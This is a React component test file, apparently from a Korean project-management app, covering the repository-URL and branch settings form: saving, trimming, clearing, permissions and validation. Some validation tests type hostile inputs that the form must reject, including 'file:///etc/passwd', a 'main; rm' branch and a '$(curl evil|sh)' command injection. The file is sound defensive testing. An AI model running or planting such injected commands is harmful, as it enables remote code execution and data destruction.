// 프로젝트 설정 「연결된 저장소」(WP-1011) — 화면 테스트. 섹션 컴포넌트(RepositorySettings)만 띄워 저장 payload·형식 검증·지우기·읽기 전용을 본다.
import { screen } from '@testing-library/react'
import { http, HttpResponse } from 'msw'
import { expect, test } from 'vitest'

import { RepositorySettings } from '@/pages/projects/components/RepositorySettings'
import { renderScreen } from '@/test/renderScreen'
import type { ProjectResponse } from '@/types/project'

import { createProject } from '../../../e2e/factories/project.factory'

const KEY = 'WP'

/** 섹션을 띄운다 — PATCH 본문을 모아 돌려준다. */
function open(project: ProjectResponse, canManage = true) {
  const bodies: unknown[] = []
  const view = renderScreen(<RepositorySettings project={project} canManage={canManage} />, {
    path: `/projects/${KEY}/settings`,
    handlers: [
      http.patch(`/api/v1/projects/${KEY}`, async ({ request }) => {
        const body = (await request.json()) as Record<string, unknown>
        bodies.push(body)
        return HttpResponse.json({ ...project, ...body })
      }),
      http.get(`/api/v1/projects/${KEY}`, () => HttpResponse.json(project)),
    ],
  })
  return { ...view, bodies }
}

test('저장소 주소·기본 브랜치를 넣고 저장하면 두 칸을 PATCH 로 보낸다(앞뒤 공백은 다듬는다)', async () => {
  const { user, bodies } = open(createProject())
  await user.type(screen.getByLabelText('저장소 주소'), '  https://github.com/acme/app.git ')
  await user.type(screen.getByLabelText('기본 브랜치'), 'develop')
  await user.click(screen.getByRole('button', { name: '저장' }))

  expect(await screen.findByText('연결된 저장소를 저장했습니다')).toBeInTheDocument()
  expect(bodies).toEqual([{ repositoryUrl: 'https://github.com/acme/app.git', repositoryBranch: 'develop' }])
})

test('저장된 값을 보여 주고, 둘 다 비우고 저장하면 빈 문자열로 보내 연결을 지운다', async () => {
  const { user, bodies } = open(
    createProject({ repositoryUrl: 'git@github.com:acme/app.git', repositoryBranch: 'main' }),
  )
  const url = screen.getByLabelText('저장소 주소')
  expect(url).toHaveValue('git@github.com:acme/app.git')
  expect(screen.getByLabelText('기본 브랜치')).toHaveValue('main')

  await user.clear(url)
  await user.clear(screen.getByLabelText('기본 브랜치'))
  await user.click(screen.getByRole('button', { name: '저장' }))

  expect(await screen.findByText('저장소 연결을 지웠습니다')).toBeInTheDocument()
  expect(bodies).toEqual([{ repositoryUrl: '', repositoryBranch: '' }])
})

test('주소·브랜치 형식이 틀리면 칸 아래 안내하고 요청을 보내지 않는다', async () => {
  const { user, bodies } = open(createProject())
  await user.type(screen.getByLabelText('저장소 주소'), 'file:///etc/passwd')
  await user.type(screen.getByLabelText('기본 브랜치'), 'main; rm')
  await user.click(screen.getByRole('button', { name: '저장' }))

  expect(await screen.findByText('https://, ssh:// 또는 사용자@호스트:경로 형식의 저장소 주소를 입력하세요')).toBeInTheDocument()
  expect(screen.getByText('브랜치 이름에는 영문·숫자·. _ / - 만 쓸 수 있고, .. · // 나 끝의 / · .lock 은 안 돼요')).toBeInTheDocument()
  expect(screen.getByLabelText('저장소 주소')).toHaveAttribute('aria-invalid', 'true')
  expect(bodies).toEqual([])
})

test('git 이 받지 않는 브랜치 이름(끝의 /)은 막고, git@ 가 아닌 사용자의 scp 주소는 받는다', async () => {
  const { user, bodies } = open(createProject())
  await user.type(screen.getByLabelText('저장소 주소'), 'deploy@git.corp:/srv/app.git')
  await user.type(screen.getByLabelText('기본 브랜치'), 'release/')
  await user.click(screen.getByRole('button', { name: '저장' }))
  expect(await screen.findByText('브랜치 이름에는 영문·숫자·. _ / - 만 쓸 수 있고, .. · // 나 끝의 / · .lock 은 안 돼요')).toBeInTheDocument()
  expect(screen.queryByText('https://, ssh:// 또는 사용자@호스트:경로 형식의 저장소 주소를 입력하세요')).not.toBeInTheDocument()
  expect(bodies).toEqual([])

  await user.type(screen.getByLabelText('기본 브랜치'), '1.0')
  await user.click(screen.getByRole('button', { name: '저장' }))
  expect(await screen.findByText('연결된 저장소를 저장했습니다')).toBeInTheDocument()
  expect(bodies).toEqual([{ repositoryUrl: 'deploy@git.corp:/srv/app.git', repositoryBranch: 'release/1.0' }])
})

test('주소만 지우고 저장해도 브랜치까지 지워 보낸다 — 옛 브랜치가 다음 연결에 따라붙지 않게', async () => {
  const { user, bodies } = open(createProject({ repositoryUrl: 'https://github.com/acme/app.git', repositoryBranch: 'develop' }))
  await user.clear(screen.getByLabelText('저장소 주소'))
  await user.click(screen.getByRole('button', { name: '저장' }))

  expect(await screen.findByText('저장소 연결을 지웠습니다')).toBeInTheDocument()
  expect(bodies).toEqual([{ repositoryUrl: '', repositoryBranch: '' }])
  expect(screen.getByLabelText('기본 브랜치')).toHaveValue('')
})

test('셸 글자가 든 주소·아이디와 토큰이 든 주소는 칸 아래 안내하고 요청을 보내지 않는다', async () => {
  const { user, bodies } = open(createProject())
  const url = screen.getByLabelText('저장소 주소')
  await user.type(url, 'https://x.com/a$(curl evil|sh)')
  await user.click(screen.getByRole('button', { name: '저장' }))
  expect(await screen.findByText('https://, ssh:// 또는 사용자@호스트:경로 형식의 저장소 주소를 입력하세요')).toBeInTheDocument()

  await user.clear(url)
  await user.type(url, 'https://me:ghp_tok@github.com/acme/app.git')
  await user.click(screen.getByRole('button', { name: '저장' }))
  expect(await screen.findByText('주소에 아이디·토큰은 넣지 않아요 — AI 컴퓨터의 git 자격 증명으로 접근해요')).toBeInTheDocument()
  expect(screen.queryByText('https://, ssh:// 또는 사용자@호스트:경로 형식의 저장소 주소를 입력하세요')).not.toBeInTheDocument()
  expect(bodies).toEqual([])
})

test('앞뒤 공백만 덧붙여 저장하면 다듬은 값으로 돌아오고 저장 버튼이 다시 막힌다', async () => {
  const { user, bodies } = open(createProject({ repositoryUrl: 'https://github.com/acme/app.git', repositoryBranch: null }))
  const url = screen.getByLabelText('저장소 주소')
  await user.type(url, '  ')
  await user.click(screen.getByRole('button', { name: '저장' }))

  expect(await screen.findByText('연결된 저장소를 저장했습니다')).toBeInTheDocument()
  expect(bodies).toEqual([{ repositoryUrl: 'https://github.com/acme/app.git', repositoryBranch: '' }])
  expect(url).toHaveValue('https://github.com/acme/app.git')
  expect(screen.getByRole('button', { name: '저장' })).toBeDisabled()
})

test('저장 권한이 없으면 값만 보이고 칸은 막히며 저장 버튼이 없다', async () => {
  open(createProject({ repositoryUrl: 'https://github.com/acme/app.git', repositoryBranch: null }), false)
  expect(screen.getByLabelText('저장소 주소')).toBeDisabled()
  expect(screen.getByLabelText('저장소 주소')).toHaveValue('https://github.com/acme/app.git')
  expect(screen.getByLabelText('기본 브랜치')).toBeDisabled()
  expect(screen.queryByRole('button', { name: '저장' })).not.toBeInTheDocument()
})
